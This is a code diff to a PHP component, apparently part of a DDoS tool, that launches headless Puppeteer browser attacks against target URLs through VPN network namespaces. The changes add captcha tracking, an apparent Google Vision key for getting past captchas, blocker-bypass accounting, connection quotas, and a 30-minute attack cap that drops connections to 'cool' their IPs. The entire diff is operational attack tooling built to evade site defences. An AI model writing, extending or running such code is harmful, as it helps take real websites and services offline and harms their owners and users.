@@ -2,6 +2,8 @@
 
 class PuppeteerApplication extends HackApplication
 {
+    const MAX_ATTACK_DURATION = 30 * 60;
+
     private $process,
             $processPGid,
             $pipes,
@@ -9,6 +11,7 @@ class PuppeteerApplication extends HackApplication
             $launchFailed = false,
             $currentCountry = '',
             $stat,
+            $jsonDataReceivedDuringThisSession,
             $stdoutBrokenLineCount,
             $stdoutBuffer = '',
             $statisticsBadgePreviousRet = '',
@@ -19,6 +22,7 @@ class PuppeteerApplication extends HackApplication
 
     public function processLaunch()
     {
+        global $IS_IN_DOCKER, $PUPPETEER_DDOS_BROWSER_VISIBLE_IN_VBOX;
 
         if ($this->launchFailed) {
             return -1;
@@ -37,12 +41,22 @@ class PuppeteerApplication extends HackApplication
         chown($this->workingDirectory, 'user');
         chgrp($this->workingDirectory, 'user');
 
+        $caHeadless                = $IS_IN_DOCKER  ?  '  --headless' : '';
+        $caBrowserVisible          = $PUPPETEER_DDOS_BROWSER_VISIBLE_IN_VBOX  ?  '  --browser-visible' : '';
+
+        $googleVisionKeyPath = Config::$putYourOvpnFilesHerePath . '/google-vision-key.json';
+        $caGoogleVisionKey = $googleVisionKeyPath ? '  --google-vision-key-path="' . $googleVisionKeyPath . '"' : '';
+
         $command = 'cd "' . __DIR__ . '" ;   '
                  . 'ip netns exec ' . $this->vpnConnection->getNetnsName() . '   '
                  . "nice -n 10   /sbin/runuser  -u user  -g user   --   "
-                 . __DIR__ . "/puppeteer-ddos.cli.js  "
-                 . "--connection-index=" . $this->vpnConnection->getIndex() . "  --working-directory=\"{$this->workingDirectory}\"  --enable-stdin-commands"
-                 . "   2>&1";
+                 . static::$cliAppPath . '  '
+                 . '  --connection-index=' . $this->vpnConnection->getIndex()
+                 . "  --working-directory=\"{$this->workingDirectory}\""
+                 .    $caHeadless
+                 .    $caBrowserVisible
+                 .    $caGoogleVisionKey
+                 . '  2>&1';
 
         $this->log($command);
         $descriptorSpec = array(
@@ -94,13 +108,16 @@ class PuppeteerApplication extends HackApplication
                 $lineObj = json_decode($line);
 
                 if (is_object($lineObj)) {
-
                     unset($lines[$lineIndex]);
                     $this->stdoutBrokenLineCount = 0;
                     $ret .= $this->processJsonLine($line, $lineObj);
-
+                } else if (
+                        !$this->stdoutBrokenLineCount
+                    &&  mb_substr($line, 0, 1) !== '{'
+                ) {
+                    unset($lines[$lineIndex]);
+                    $ret .= $line;
                 } else {
-
                     $this->stdoutBrokenLineCount++;
                     if ($this->stdoutBrokenLineCount > 3) {
                         $this->stdoutBrokenLineCount = 0;
@@ -122,6 +139,7 @@ class PuppeteerApplication extends HackApplication
     private function processJsonLine($line, $lineObj)
     {
         $ret = '';
+        $this->jsonDataReceivedDuringThisSession = true;
 
         $newStatItem = new \stdClass();
         $newStatItem->httpRequestsSent               = 0;
@@ -130,6 +148,8 @@ class PuppeteerApplication extends HackApplication
         $newStatItem->httpRenderRequestsSent         = 0;
         $newStatItem->ddosBlockedRequests            = 0;
         $newStatItem->sumDuration                    = 0;
+
+        $newStatItem->captchasWereFound              = 0;
 
         if (!$this->stat->total) {
             $this->stat->total = clone $newStatItem;
@@ -159,6 +179,7 @@ class PuppeteerApplication extends HackApplication
             $duration        = val($lineObj, 'duration');
             $navigateTimeout = val($lineObj, 'navigateTimeout');
             $requireBlockerBypass = val($lineObj, 'requireBlockerBypass');
+            $captchaWasFound = val($lineObj, 'captchaWasFound');
 
             $targetItem = $this->stat->targets[$entryUrl] ?? null;
             if (!$targetItem) {
@@ -193,6 +214,14 @@ class PuppeteerApplication extends HackApplication
                        $targetItem->sumDuration += $duration;
             }
 
+            if (
+                    $requestType === 'http-render-get'
+                &&  $captchaWasFound
+            ) {
+                $this->stat->total->captchasWereFound++;
+                       $targetItem->captchasWereFound++;
+            }
+
             $this->stat->targets[$entryUrl] = $targetItem;
 
         } else if (!$this->debug) {
@@ -222,6 +251,12 @@ class PuppeteerApplication extends HackApplication
             && $this->stat->total->httpRequestsSent / $this->stat->total->httpRenderRequestsSent < 100
         ) {
             $this->terminateMessage = "Too many render requests";
+            $this->requireTerminate = true;
+        } else if (
+               $this->stat->total->captchasWereFound > 5
+            && $this->stat->total->httpRequestsSent / $this->stat->total->captchasWereFound < 500
+        ) {
+            $this->terminateMessage = "Too many captcha";
             $this->requireTerminate = true;
         }
 
@@ -425,7 +460,9 @@ class PuppeteerApplication extends HackApplication
     // ----------------------  Static part of the class ----------------------
 
     private static int     $puppeteerApplicationStartedDuringThisSession = 0;
-    private static string  $workingDirectoryRoot;
+    private static bool    $showCaptchaBrowsersSentDuringThisSession = false;
+    private static string  $workingDirectoryRoot,
+                           $cliAppPath;
     private static object  $closedPuppeteerApplicationsNetworkStats,
                            $runningPuppeteerApplicationsNetworkStats,
                            $runningPuppeteerApplicationsNetworkStatsThisSession;
@@ -436,6 +473,10 @@ class PuppeteerApplication extends HackApplication
         global $TEMP_DIR;
 
         static::$workingDirectoryRoot = $TEMP_DIR . '/puppeteer-ddos';
+        static::$cliAppPath = __DIR__ . "/secret/puppeteer-ddos.cli.js";
+        if (!file_exists(static::$cliAppPath)) {
+            static::$cliAppPath = __DIR__ . "/puppeteer-ddos-dist.cli.js";
+        }
 
         static::$closedPuppeteerApplicationsNetworkStats = new \stdClass();
         static::$closedPuppeteerApplicationsNetworkStats->received = 0;
@@ -459,13 +500,18 @@ class PuppeteerApplication extends HackApplication
         Actions::addAction('BeforeTerminateSession',       [static::class, 'actionBeforeTerminateSession']);
         Actions::addFilter('OpenVpnStatisticsBadge',        [static::class, 'filterOpenVpnStatisticsBadge']);
         Actions::addFilter('OpenVpnStatisticsSessionBadge', [static::class, 'filterOpenVpnStatisticsSessionBadge']);
-        Actions::addAction('AfterMainOutputLoopIteration', [static::class, 'showCaptchaBrowsers']);
-
+        Actions::addAction('BeforeMainOutputLoopIterations',[static::class, 'closeInstances']);
+        Actions::addAction('AfterMainOutputLoopIterations', [static::class, 'showCaptchaBrowsers']);
     }
 
     public static function actionAfterInitSession()
     {
         static::$puppeteerApplicationStartedDuringThisSession = 0;
+        static::$showCaptchaBrowsersSentDuringThisSession = false;
+
+        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
+            $puppeteerApplication->jsonDataReceivedDuringThisSession = false;
+        }
     }
 
     public static function actionBeforeTerminateSession()
@@ -500,7 +546,7 @@ class PuppeteerApplication extends HackApplication
             &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->received
             &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
         ) {
-            $value .= OpenVpnStatistics::getTrafficMessage(
+            $value .= getHumanBytesLabel(
                 'PuppeteerDDoS session traffic',
                 static::$runningPuppeteerApplicationsNetworkStatsThisSession->received,
                 static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
@@ -530,7 +576,7 @@ class PuppeteerApplication extends HackApplication
             &&  $totalTransmittedTraffic
             &&  $effectiveResponsesReceived
         ) {
-            $value .= OpenVpnStatistics::getTrafficMessage(
+            $value .= getHumanBytesLabel(
                 'PuppeteerDDoS total traffic',
                 $totalReceivedTraffic,
                 $totalTransmittedTraffic
@@ -542,34 +588,35 @@ class PuppeteerApplication extends HackApplication
         return $value;
     }
 
-    public static function getNewObject($vpnConnection)
+    public static function closeInstances()
     {
-        global $IS_IN_DOCKER, $PARALLEL_VPN_CONNECTIONS_QUANTITY,
-               $PUPPETEER_DDOS_CONNECTIONS_QUOTA, $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION;
+        global $CURRENT_SESSION_DURATION;
 
-        if ($IS_IN_DOCKER) {
-            return false;
-        }
-        $puppeteerApplicationRunningInstancesCount = count(PuppeteerApplication::getRunningInstances());
-
-        if (
-                $PUPPETEER_DDOS_CONNECTIONS_QUOTA
-            &&  $puppeteerApplicationRunningInstancesCount             <  $PUPPETEER_DDOS_CONNECTIONS_QUOTA * $PARALLEL_VPN_CONNECTIONS_QUANTITY
-            &&  static::$puppeteerApplicationStartedDuringThisSession  <  $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION
-        ) {
-            static::$puppeteerApplicationStartedDuringThisSession++;
-            return new PuppeteerApplication($vpnConnection);
-        } else {
-            return false;
+        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
+            $networkStats = $puppeteerApplication->vpnConnection->calculateNetworkStats();
+            if (
+                    $networkStats->total->receiveSpeed < 50 * 1024
+                &&  $networkStats->session->duration > $CURRENT_SESSION_DURATION / 2
+            ) {
+                $puppeteerApplication->terminateMessage = 'Network speed low';
+                $puppeteerApplication->requireTerminate = true;
+            } else if ($networkStats->total->duration > static::MAX_ATTACK_DURATION) {
+                $puppeteerApplication->terminateMessage = 'Attack lasts ' . intRound($networkStats->total->duration / 60) . " minutes. Close this connection to cool it's IP";
+                $puppeteerApplication->requireTerminate = true;
+            }
         }
     }
 
     public static function showCaptchaBrowsers()
     {
-        global $MAIN_OUTPUT_LOOP_ITERATIONS_COUNT;
-
-        if ($MAIN_OUTPUT_LOOP_ITERATIONS_COUNT !== 1) {
+        if (static::$showCaptchaBrowsersSentDuringThisSession) {
             return;
+        }
+
+        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
+            if (!$puppeteerApplication->jsonDataReceivedDuringThisSession) {
+                return;
+            }
         }
 
         $soundWasPlayed = false;
@@ -582,8 +629,29 @@ class PuppeteerApplication extends HackApplication
                 }
             }
         }
+
+        static::$showCaptchaBrowsersSentDuringThisSession = true;
     }
 
+    public static function getNewObject($vpnConnection)
+    {
+        global $PARALLEL_VPN_CONNECTIONS_QUANTITY,
+               $PUPPETEER_DDOS_CONNECTIONS_QUOTA, $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION;
+
+        $puppeteerApplicationRunningInstancesCount = count(PuppeteerApplication::getRunningInstances());
+        $newPuppeteerApplicationInstancesCount     = $puppeteerApplicationRunningInstancesCount - static::$runningPuppeteerApplicationsCount;
+
+        if (
+            $PUPPETEER_DDOS_CONNECTIONS_QUOTA
+            &&  $puppeteerApplicationRunningInstancesCount  <  $PUPPETEER_DDOS_CONNECTIONS_QUOTA / 100 * $PARALLEL_VPN_CONNECTIONS_QUANTITY
+            &&  $newPuppeteerApplicationInstancesCount      <  $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION
+        ) {
+            static::$puppeteerApplicationStartedDuringThisSession++;
+            return new PuppeteerApplication($vpnConnection);
+        } else {
+            return false;
+        }
+    }
 }
 
 PuppeteerApplication::constructStatic();
